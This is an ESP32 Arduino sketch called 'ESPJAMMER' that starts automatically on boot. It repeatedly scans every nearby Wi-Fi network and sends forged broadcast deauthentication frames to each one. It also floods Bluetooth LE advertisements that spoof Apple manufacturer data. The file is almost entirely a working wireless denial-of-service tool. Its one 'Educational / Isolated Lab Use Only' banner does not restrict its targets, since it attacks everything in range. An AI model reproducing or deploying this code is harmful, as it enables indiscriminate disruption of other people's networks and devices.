#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>

// ====================== CONFIG ======================
const bool ENABLE_WIFI_DEAUTH = true;
const bool ENABLE_BLE_SPAM    = true;

const int DEAUTH_DELAY_MS     = 15;
const int SCAN_INTERVAL_MS    = 3000;
// ===================================================

uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x07, 0x00
};

void sendDeauth(uint8_t* bssid, uint8_t channel);

void wifiDeauthTask(void *pvParameters) {
    while (true) {
        if (!ENABLE_WIFI_DEAUTH) {
            vTaskDelay(1000 / portTICK_PERIOD_MS);
            continue;
        }

        Serial.println("[WiFi] Scanning for networks...");
        int n = WiFi.scanNetworks(false, true);

        for (int i = 0; i < n; ++i) {
            uint8_t* bssid = WiFi.BSSID(i);
            int channel = WiFi.channel(i);
            String ssid = WiFi.SSID(i);

            Serial.printf("[WiFi] → %s | Ch:%d | BSSID:%02X:%02X:%02X:%02X:%02X:%02X\n",
                          ssid.c_str(), channel, bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);

            sendDeauth(bssid, channel);
        }

        WiFi.scanDelete();
        vTaskDelay(SCAN_INTERVAL_MS / portTICK_PERIOD_MS);
    }
}

void sendDeauth(uint8_t* bssid, uint8_t channel) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    memcpy(&deauthPacket[10], bssid, 6);
    memcpy(&deauthPacket[16], bssid, 6);

    for (int i = 0; i < 6; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
        delay(DEAUTH_DELAY_MS);
    }
}

void bleSpamTask(void *pvParameters) {
    if (!ENABLE_BLE_SPAM) {
        vTaskDelete(NULL);
        return;
    }

    BLEDevice::init("");
    BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();

    while (true) {
        for (int i = 0; i < 15; i++) {
            BLEAdvertisementData advData = BLEAdvertisementData();

            uint8_t manuf[4] = {0x4C, 0x00, (uint8_t)random(0, 256), (uint8_t)random(0, 256)};
            std::string manufData(reinterpret_cast<const char*>(manuf), 4);

            advData.setManufacturerData(manufData);
            advData.setName("ESPJAMMER");

            pAdvertising->setAdvertisementData(advData);
            pAdvertising->start();
            delay(40);
            pAdvertising->stop();
            delay(20);
        }

        BLEScan* pScan = BLEDevice::getScan();
        pScan->setActiveScan(true);
        pScan->start(3, false);

        Serial.println("[BLE] Spam cycle completed");
        vTaskDelay(800 / portTICK_PERIOD_MS);
    }
}

void setup() {
    Serial.begin(115200);
    delay(1500);

    Serial.println("\n=== ESPJAMMER HEADLESS v1.0 ===");
    Serial.println("Educational / Isolated Lab Use Only\n");

    WiFi.mode(WIFI_STA);
    WiFi.disconnect(true);

    esp_wifi_init(NULL);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);

    xTaskCreatePinnedToCore(wifiDeauthTask, "WiFiDeauth", 8192, NULL, 1, NULL, 0);
    xTaskCreatePinnedToCore(bleSpamTask,    "BLESpam",    6144, NULL, 1, NULL, 1);

    Serial.println("WiFi Deauth + BLE Spam tasks started.");
    Serial.println("Running automatically on boot...\n");
}

void loop() {
    vTaskDelay(10000 / portTICK_PERIOD_MS);
}